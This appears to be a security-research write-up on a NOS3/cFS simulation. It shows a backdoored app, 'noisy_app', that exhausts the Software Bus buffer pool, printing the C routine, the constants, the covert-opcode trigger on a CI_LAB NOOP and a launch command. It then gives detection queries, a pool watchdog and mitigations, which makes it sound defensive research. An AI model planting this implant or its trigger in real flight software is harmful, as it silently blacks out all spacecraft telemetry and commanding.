# Software Bus pool-lock denial of service

## Question

Can one cFS application deny the Software Bus to every other application by
exhausting the shared message-buffer pool? Yes, a single co-resident app can
produce a total, persistent Software Bus blackout. Unlike the GNSS direct-memory
overwrite (`gnss-mem-overwrite-analysis.md`) and the IMU file dead-drop channel
(`imu-covert-channel-analysis.md`), which act entirely off the bus, this attack's
exhaustion primitive depends on a Software Bus operation (a `Subscribe`). That
makes it the one PoC in this implant set whose mechanism a Software-Bus mediation
control could gate, which is why it is the deliberate on-bus counterpoint to the
off-bus pair.

This document records the vector, the exact code added to demonstrate it and
where it lives, the detection signature, and the mitigations that apply.

## Background: the shared Software Bus buffer pool

cFE allocates every Software Bus message from one shared memory arena:

- `CFE_PLATFORM_SB_BUF_MEMORY_BYTES = 524288` (512 KB) -
  `nos3/cfg/nos3_defs/cpu1_platform_cfg.h:156`.
- `CFE_MISSION_SB_MAX_SB_MSG_SIZE = 32768` (32 KB) -
  `nos3/cfg/nos3_defs/cfe_mission_cfg.h:53`.

`CFE_SB_TransmitMsg` pulls a buffer descriptor from that pool
(`CFE_SB_GetBufferFromPool`, `nos3/fsw/cfe/modules/sb/fsw/src/cfe_sb_buf.c`) and
routes it to every subscribed pipe. The buffer is returned to the pool only
after the *last* subscriber's pipe has had the message received
(`CFE_SB_ReceiveBuffer`) and released. If a message has no subscribers it is
freed immediately; if a subscriber never receives it, the buffer stays out of
the pool. The pool occupancy is tracked in the SB statistics telemetry
(`MemInUse` / `PeakMemInUse` / `SBBuffersInUse`, updated in
`cfe_sb_buf.c:116,124,215`).

Two relevant safety valves exist but are blunt: a per-MID-per-pipe queue limit
(`MsgLim`, drops with `CFE_SB_MSGID_LIM_ERR_EID`) and a per-pipe depth limit
(drops with `CFE_SB_Q_FULL_ERR_EID`). Both event IDs are registered as filtered
events (`CFE_PLATFORM_SB_FILTERED_EVENT3/4`, `cpu1_platform_cfg.h:261,264`) with
the `CFE_EVS_FIRST_16_STOP` mask, so after 16 occurrences EVS suppresses them.

## Why the attack is possible

1. **One shared arena, first-come.** There is no per-app quota on the 512 KB
   pool. Any app that holds buffers out of circulation starves every other app's
   `CFE_SB_TransmitMsg`, which then fails with `CFE_SB_BUF_ALOC_ERR`.

2. **A subscriber can refuse to drain.** An app may create a deep pipe, subscribe
   to a MID with a high per-MID limit (`MsgLim`), and simply never call
   `CFE_SB_ReceiveBuffer`. Everything sent to that MID parks in its pipe, held
   out of the pool. `MsgLim` set well above the number of parked buffers means
   they are never `MSGID_LIM`-dropped back to the pool.

3. **Max-size messages drain the pool in ~15 transmits.** At 32 KB per buffer,
   `512 KB / 32 KB ~= 15` parked buffers exhaust the arena. After that, all HK,
   all telemetry, CI_LAB uplink-forwarding, and LC limit-checking stall at once:
   a silent, total Software Bus blackout. No busy-spin is needed once the pool is
   dry, and recovery requires a sim restart (the parked buffers are reclaimed
   only when the holding app is deleted).

## The PoC: code added, and where

The implant is the existing supply-chain fixture `noisy_app`
(`nos3/fsw/apps/noisy_app/fsw/src/noisy_app.c`). The denial is opcode
`OPCODE_SB_FLOOD` (`0x08`, defined at `noisy_app.c:97`), dormant until triggered
over the piggyback channel. The following code implements it.

### Covert opcode and tuning constants (`noisy_app.c:97, 110-123`)

```c
#define OPCODE_SB_FLOOD 0x08    /* DESTRUCTIVE: lock the whole SB buffer pool */

#define LOCK_MID        NOISY_APP_HK_TLM_MID  /* 0x08F2: a MID we own + never drain */
/* Invariant: LOCK_PARK_ATTEMPTS <= LOCK_MSGLIM <= LOCK_PIPE_DEPTH, and all
 * comfortably exceed the ~15 max-size buffers that actually drain the pool.
 * LOCK_PIPE_DEPTH must also be <= CFE_PLATFORM_SB_MAX_PIPE_DEPTH: CFE_SB_CreatePipe
 * rejects any depth above the platform maximum. Confirm the platform value and
 * keep LOCK_PIPE_DEPTH at or below it (a depth larger than the maximum silently
 * fails CreatePipe, so NOISY_SbPoolLock would return at its first line and the
 * flood would never arm). The shipped value still triples the ~15 buffers needed
 * to drain the pool, so the attack remains effective. */
#define LOCK_PIPE_DEPTH    50
#define LOCK_MSGLIM        50
#define LOCK_PARK_ATTEMPTS 50
```

### The maximum-size packet type (`noisy_app.c:271-274`)

A telemetry header padded out to the mission max message size, so each parked
buffer consumes a full 32 KB pool block and only ~15 are needed:

```c
typedef struct
{
    CFE_MSG_TelemetryHeader_t Hdr;
    uint8                     Pad[CFE_MISSION_SB_MAX_SB_MSG_SIZE - sizeof(CFE_MSG_TelemetryHeader_t)];
} NOISY_MaxPkt_t;
```

### The pool-lock routine (`noisy_app.c:295-350`)

```c
static void NOISY_SbPoolLock(void)
{
    static NOISY_MaxPkt_t big;                 /* 32 KB: keep it off the task stack */
    CFE_SB_PipeId_t       sink   = CFE_SB_INVALID_PIPE;
    int                   parked = 0;
    int                   i;

    /* A deep pipe we deliberately never drain, with a high per-MID limit so our
     * own buffers pile up instead of being MSGID_LIM-dropped. */
    if (CFE_SB_CreatePipe(&sink, LOCK_PIPE_DEPTH, "NOISY_SINK") != CFE_SUCCESS)
    {
        return;
    }

    if (CFE_SB_SubscribeEx(CFE_SB_ValueToMsgId(LOCK_MID), sink, CFE_SB_DEFAULT_QOS, LOCK_MSGLIM) !=
        CFE_SUCCESS)
    {
        CFE_SB_DeletePipe(sink);
        return;
    }

    /* Emit the warning BEFORE the pool is gone (EVS itself rides the bus). */
    CFE_EVS_SendEvent(NOISY_EVT_POOLLOCK, CFE_EVS_EventType_CRITICAL,
                      "NOISY_APP: SB POOL LOCK engaged (DoS, research mode).");

    memset(&big, 0, sizeof(big));
    CFE_MSG_Init(CFE_MSG_PTR(big.Hdr), CFE_SB_ValueToMsgId(LOCK_MID), sizeof(big));

    for (i = 0; i < LOCK_PARK_ATTEMPTS; i++)
    {
        CFE_SB_TimeStampMsg(CFE_MSG_PTR(big.Hdr));
        if (CFE_SB_TransmitMsg(CFE_MSG_PTR(big.Hdr), true) != CFE_SUCCESS)
        {
            break;                              /* pool is now dry: the lock is held */
        }
        parked++;
    }

    /* Forensic record that SURVIVES the blackout: the ES syslog does not ride
     * the SB, so this line persists even though the CRITICAL EVS above may be
     * among the last messages the bus ever carried. */
    CFE_ES_WriteToSysLog("NOISY_APP: SB pool lock parked %d buffers (~%u bytes); bus is now dry.\n",
                         parked, (unsigned int)(parked * sizeof(NOISY_MaxPkt_t)));

    /* Returns with the pool empty; parked buffers keep it that way with no
     * further CPU use. (sink is intentionally leaked - the lock IS the point.) */
}
```

Design points worth calling out for the thesis:

- **`LOCK_MID` is the implant's own HK MID (`NOISY_APP_HK_TLM_MID`, 0x08F2).**
  The flood loopbacks on a MID the app legitimately owns; it does not need to
  forge or impersonate any victim MID. This is what makes the *publish* side
  unremarkable, and what makes the *subscribe* side the single dependency the
  whole mechanism rests on.
- **The CRITICAL event is emitted before the loop, on purpose.** EVS itself
  publishes on the Software Bus, so once the pool is dry no further EVS can be
  sent. The "engaged" warning must go out while a buffer is still available.
- **The syslog line is the durable artifact.** `CFE_ES_WriteToSysLog` writes to
  the ES system log, which is not transported over the SB, so the parked-buffer
  count survives the blackout that silences EVS and HK.
- **The sink pipe is intentionally leaked on the success path.** Deleting it
  would return the parked buffers to the pool and lift the lock; holding it is
  the attack.

### Wiring: dispatcher and covert delivery

The opcode is dispatched in `NOISY_APP_RunScenario` (`noisy_app.c:534-536`):

```c
case OPCODE_SB_FLOOD:
    NOISY_SbPoolLock();   /* DESTRUCTIVE: locks the SB pool */
    break;
```

Delivery reuses the existing piggyback channel. `noisy_app` subscribes to the
carrier `CI_LAB_CMD_MID` (`CARRIER_CMD_MID 0x18E0`, `noisy_app.c:89`, subscribed
at `noisy_app.c:575`). cFE SB delivers every message to all subscribers with no
sender authentication, so the implant observes the legitimate command stream. In
the message handler (`noisy_app.c:624-638`) an over-length NOOP on the carrier
(function code 0, more bytes than a header-only NOOP) is recognized, and its
trailing byte is read as the covert opcode:

```c
bool is_carrier_noop = (CFE_SB_MsgIdToValue(MsgId) == CARRIER_CMD_MID) && (FcnCode == CARRIER_NOOP_FC);
...
uint8 opcode = ((const uint8 *)BufPtr)[Size - 1];
...
NOISY_APP_RunScenario(opcode);
```

So a single 9-byte CI_LAB NOOP whose last byte is `0x08` triggers the blackout.

### Trigger

```
python3 nos3/poc/piggyback_noisy/drive_poc.py <FSW_IP> <DEST_IP> flood   # SB pool lock
```

## On-bus vs off-bus: where this PoC sits

The pool-lock attack is unique among the implant's scenarios in that its
exhaustion primitive *requires a real subscriber*: without one, every
`CFE_SB_TransmitMsg` in the loop finds zero destinations and frees its buffer
immediately, so the pool never drains. The subscriber it needs is its own
`SubscribeEx` to `LOCK_MID = 0x08F2`. That subscribe is a Software Bus operation,
which means - in contrast with the GNSS/IMU PoCs that bypass the bus entirely by
acting off-bus (direct memory store / file dead-drop) - this mechanism is exactly
the kind of operation a bus-level mediation control could observe and gate. It is
the on-bus counterpoint that demonstrates the boundary the off-bus PoCs cross.

### Bound on the claim: AllocateMessageBuffer would bypass a subscribe gate

The subscribe dependency does not mean pool exhaustion as a class depends on a
subscribe. `CFE_SB_AllocateMessageBuffer`
(`nos3/fsw/cfe/modules/sb/fsw/src/cfe_sb_api.c:1372`) draws a buffer from the same
pool (`CFE_SB_GetBufferFromPool`) but takes no subscribe and no transmit. An
implant that calls `AllocateMessageBuffer` in a loop and never transmits or frees
the buffers would exhaust the identical 512 KB arena with neither a subscribe nor
a transmit. This PoC deliberately uses the subscribe-park mechanism so the on-bus
dependency is the teaching point; the allocate-leak variant is noted only to
bound the conclusion: pool exhaustion is a resource problem, not a pub/sub
problem.

## Detection

- **Engaged signature.** A single CRITICAL `NOISY_APP: SB POOL LOCK engaged`
  EVS event (likely among the last messages the bus carries), immediately
  followed by a simultaneous flatline of ALL HK/telemetry in
  `attack_logs/cfs_god_view.json`, plus the `CFE_ES_WriteToSysLog` parked-buffer
  line in the cFS console/syslog that survives the blackout. The
  all-subsystems-at-once flatline is the strongest tell: no single failed app
  looks like that.

KQL quick reference (Kibana, index `nos3-telemetry-*`):

| What | KQL |
|---|---|
| Pool lock engaged | `message:"SB POOL LOCK engaged"` |
| Blackout | a coincident drop to zero across all `*_hk` / telemetry series |

## The defensive layer that actually applies

An ACL is the wrong layer for resource exhaustion as a class: it is
MID/operation-scoped and has no view of pool occupancy. The control that catches
exhaustion *regardless of which API drained the pool* is a resource watchdog on
the data cFE already produces. The SB statistics/HK telemetry reports `MemInUse`
and `PeakMemInUse` (`cfe_sb_task.c:311`; the framework even computes
`CFE_PLATFORM_SB_BUF_MEMORY_BYTES - PeakMemInUse` as free headroom at
`cfe_sb_task.c:313`). Two complementary detections:

- **Ground / ELK:** index the SB HK `MemInUse` and alert when it approaches
  `CFE_PLATFORM_SB_BUF_MEMORY_BYTES` (524288). This catches both the
  subscribe-park flood and the allocate-leak variant.
- **Onboard:** a small monitor app (or an LC watchpoint on the SB HK field) that
  trips SAFE / raises an event when free pool headroom crosses a threshold, so
  the spacecraft reacts before the bus is fully dry.

Note that once the pool is exhausted the SB HK packet itself can no longer be
transmitted, so the watchdog must sample the trend *before* exhaustion; the
attack reaches the dry state in well under a second, which argues for the
onboard monitor over a ground rule that only sees periodic downlink.

## Mitigations and their limits

- **Per-app pool quotas** would structurally bound any one app's buffer hold, but
  cFE's SB pool is a single un-partitioned arena; this is an upstream design
  change, not a config knob.
- **Supply-chain control** remains the primary defense: do not ship the implant.
  Load-time image integrity (signed app modules, an expected-app manifest, boot
  attestation of the loaded module set) keeps a backdoored app off the bus.
- **Runtime detection** (the pool-stat watchdog above) is the residual control
  once an implant is resident: it does not prevent the exhaustion but makes it
  observable and actionable.

## Scope

This PoC and document demonstrate the vector and the detection. They use the
on-bus subscribe-park mechanism deliberately (so the on-bus dependency is the
teaching point) and do not implement the allocate-leak bypass, do not add per-app
pool quotas to cFE, and do not add a new onboard watchdog app (the pool-stat
watchdog is recorded as the recommended control). The blackout is restart-only by
design; recover with `make stop` + relaunch (run `make save-run` first to keep
the evidence).
